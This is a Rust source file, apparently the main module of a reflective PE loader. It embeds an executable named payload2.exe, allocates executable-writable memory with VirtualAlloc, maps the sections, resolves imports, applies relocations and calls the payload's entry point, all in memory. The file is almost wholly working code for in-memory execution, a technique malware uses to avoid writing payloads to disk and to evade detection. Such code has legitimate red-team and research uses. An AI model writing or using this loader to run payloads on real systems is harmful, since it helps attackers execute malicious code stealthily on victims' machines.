pub mod iat;
pub mod pe;

use std::ffi::c_void;

use windows::Win32::{
    Foundation::GetLastError,
    System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, VirtualAlloc},
};

fn main() {
    let payload_bytes = include_bytes!("payload2.exe");

    let dos_header = pe::get_dos_header(payload_bytes);
    let nt_header = pe::get_nt_header(payload_bytes);

    let image_size = pe::get_image_size(payload_bytes);

    println!("[*] Allocating memory for payload");
    let baseptr = allocate_memory(image_size);

    println!();
    println!("[*] Writing sections to memory");
    pe::write_sections(payload_bytes, baseptr, &nt_header, &dos_header);

    println!();
    println!("[*] Writing import address table");
    iat::resolve_imports(baseptr, &nt_header);

    println!();
    println!("[*] Fixing relocations");
    pe::fix_relocations(baseptr, &nt_header);

    println!();
    println!("[*] Executing payload");

    let entrypoint = nt_header.OptionalHeader.AddressOfEntryPoint;
    unsafe {
        let entrypoint_func: extern "C" fn() =
            std::mem::transmute(baseptr.add(entrypoint as usize));
        entrypoint_func();
    }
    println!("[*] Payload executed");
}

fn allocate_memory(size: usize) -> *mut c_void {
    unsafe {
        println!("Allocating {} bytes", size);
        let baseptr = VirtualAlloc(None, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        if baseptr.is_null() {
            panic!("VirtualAlloc failed. Error: {:?}", GetLastError());
        }
        println!("VirtualAlloc succeeded. Base address: {:?}", baseptr);
        baseptr
    }
}
